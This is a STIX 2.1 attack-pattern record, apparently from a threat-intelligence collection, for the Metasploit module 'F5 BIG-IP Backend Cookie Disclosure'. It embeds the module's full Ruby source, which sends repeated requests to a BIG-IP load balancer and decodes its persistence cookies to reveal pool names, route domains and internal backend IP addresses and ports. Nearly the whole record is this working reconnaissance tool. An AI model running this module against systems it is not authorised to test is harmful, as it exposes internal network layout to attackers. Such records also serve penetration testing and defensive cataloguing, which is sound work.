{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8a3236c-d098-4be5-a39a-dd20c826c09c",
    "created": "2024-08-14T16:32:41.204068Z",
    "modified": "2024-08-14T16:32:41.204072Z",
    "name": "F5 BIG-IP Backend Cookie Disclosure",
    "description": " This module identifies F5 BIG-IP load balancers and leaks backend information (pool name, routed domain, and backend servers' IP addresses and ports) through cookies inserted by the BIG-IP systems. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/f5_bigip_cookie_disclosure.rb",
            "external_id": "f5_bigip_cookie_disclosure.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K6917"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K7784"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K14784"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K23254150"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 BIG-IP Backend Cookie Disclosure',\n        'Description' => %q{\n          This module identifies F5 BIG-IP load balancers and leaks backend information\n          (pool name, routed domain, and backend servers' IP addresses and ports) through\n          cookies inserted by the BIG-IP systems.\n        },\n        'Author' => [\n          'Thanat0s <thanspam[at]trollprod.org>',\n          'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',\n          'Nikita Oleksov <neoleksov[at]gmail.com>',\n          'Denis Kolegov <dnkolegov[at]gmail.com>',\n          'Paul-Emmanuel Raoul <skyper@skyplabs.net>'\n        ],\n        'References' => [\n          ['URL', 'https://support.f5.com/csp/article/K6917'],\n          ['URL', 'https://support.f5.com/csp/article/K7784'],\n          ['URL', 'https://support.f5.com/csp/article/K14784'],\n          ['URL', 'https://support.f5.com/csp/article/K23254150']\n        ],\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('RPORT', [true, 'The BIG-IP service port', 443]),\n        OptString.new('TARGETURI', [true, 'The URI path to test', '/']),\n        OptInt.new('REQUESTS', [true, 'The number of requests to send', 10])\n      ]\n    )\n  end\n\n  def change_endianness(value, size = 4)\n    conversion = nil\n    if size == 4\n      conversion = [value].pack('V').unpack('N').first\n    elsif size == 2\n      conversion = [value].pack('v').unpack('n').first\n    end\n    conversion\n  end\n\n  def cookie_decode(cookie_value)\n    backend = {}\n    if cookie_value =~ /(\\d{8,10})\\.(\\d{1,5})\\./\n      host = Regexp.last_match(1).to_i\n      port = Regexp.last_match(2).to_i\n      host = change_endianness(host)\n      host = Rex::Socket.addr_itoa(host)\n      port = change_endianness(port, 2)\n    elsif cookie_value.downcase =~ /rd\\d+o0{20}f{4}([a-f0-9]{8})o(\\d{1,5})/\n      host = Regexp.last_match(1).to_i(16)\n      port = Regexp.last_match(2).to_i\n      host = Rex::Socket.addr_itoa(host)\n    elsif cookie_value.downcase =~ /vi([a-f0-9]{32})\\.(\\d{1,5})/\n      host = Regexp.last_match(1).to_i(16)\n      port = Regexp.last_match(2).to_i\n      host = Rex::Socket.addr_itoa(host, true)\n      port = change_endianness(port, 2)\n    elsif cookie_value.downcase =~ /rd\\d+o([a-f0-9]{32})o(\\d{1,5})/\n      host = Regexp.last_match(1).to_i(16)\n      port = Regexp.last_match(2).to_i\n      host = Rex::Socket.addr_itoa(host, true)\n    else\n      host = nil\n      port = nil\n    end\n\n    backend[:host] = host.nil? ? nil : host\n    backend[:port] = port.nil? ? nil : port\n    backend\n  end\n\n  def fetch_cookie\n    # Request a page and extract a F5 looking cookie\n    cookie = {}\n    res = send_request_raw('method' => 'GET', 'uri' => @uri)\n\n    unless res.nil?\n      # Get the SLB session IDs for all cases:\n      # 1. IPv4 pool members - \"BIGipServerWEB=2263487148.3013.0000\",\n      # 2. IPv4 pool members in non-default routed domains - \"BIGipServerWEB=rd5o00000000000000000000ffffc0000201o80\",\n      # 3. IPv6 pool members - \"BIGipServerWEB=vi20010112000000000000000000000030.20480\",\n      # 4. IPv6 pool members in non-default route domains - \"BIGipServerWEB=rd3o20010112000000000000000000000030o80\"\n\n      regexp = /\n        ([~.\\-\\w]+)=(((?:\\d+\\.){2}\\d+)|\n        (rd\\d+o0{20}f{4}\\w+o\\d{1,5})|\n        (vi([a-f0-9]{32})\\.(\\d{1,5}))|\n        (rd\\d+o([a-f0-9]{32})o(\\d{1,5})))\n        (?:$|,|;|\\s)\n      /x\n      m = res.get_cookies.match(regexp)\n      cookie[:id] = m.nil? ? nil : m[1]\n      cookie[:value] = m.nil? ? nil : m[2]\n    end\n    cookie\n  end\n\n  def run\n    requests = datastore['REQUESTS']\n    backends = []\n    cookie_name = ''\n    pool_name = ''\n    route_domain = ''\n    @uri = normalize_uri(target_uri.path.to_s)\n    print_status(\"Starting request #{@uri}\")\n\n    (1..requests).each do |i|\n      cookie = fetch_cookie # Get the cookie\n      # If the cookie is not found, stop process\n      if cookie.empty? || cookie[:id].nil?\n        print_error('F5 BIG-IP load balancing cookie not found')\n        return nil\n      end\n\n      # Print the cookie name on the first request\n      if i == 1\n        cookie_name = cookie[:id]\n        print_good(\"F5 BIG-IP load balancing cookie \\\"#{cookie_name} = #{cookie[:value]}\\\" found\")\n        if cookie[:id].start_with?('BIGipServer')\n          pool_name = cookie[:id].split('BIGipServer')[1]\n          print_good(\"Load balancing pool name \\\"#{pool_name}\\\" found\")\n        end\n        if cookie[:value].start_with?('rd')\n          route_domain = cookie[:value].split('rd')[1].split('o')[0]\n          print_good(\"Route domain \\\"#{route_domain}\\\" found\")\n        end\n      end\n\n      backend = cookie_decode(cookie[:value])\n      unless backend[:host].nil? || backends.include?(backend)\n        print_good(\"Backend #{backend[:host]}:#{backend[:port]} found\")\n        backends.push(backend)\n      end\n    end\n\n    # Reporting found cookie name in database\n    unless cookie_name.empty?\n      report_note(host: rhost, type: 'f5_load_balancer_cookie_name', data: cookie_name)\n      # Reporting found pool name in database\n      unless pool_name.empty?\n        report_note(host: rhost, type: 'f5_load_balancer_pool_name', data: pool_name)\n      end\n      # Reporting found route domain in database\n      unless route_domain.empty?\n        report_note(host: rhost, type: 'f5_load_balancer_route_domain', data: route_domain)\n      end\n    end\n    # Reporting found backends in database\n    unless backends.empty?\n      report_note(host: rhost, type: 'f5_load_balancer_backends', data: backends)\n    end\n  rescue ::Rex::ConnectionRefused, ::Rex::ConnectionError\n    print_error('Network connection error')\n  rescue ::OpenSSL::SSL::SSLError\n    print_error('SSL/TLS connection error')\n  end\nend\n"
}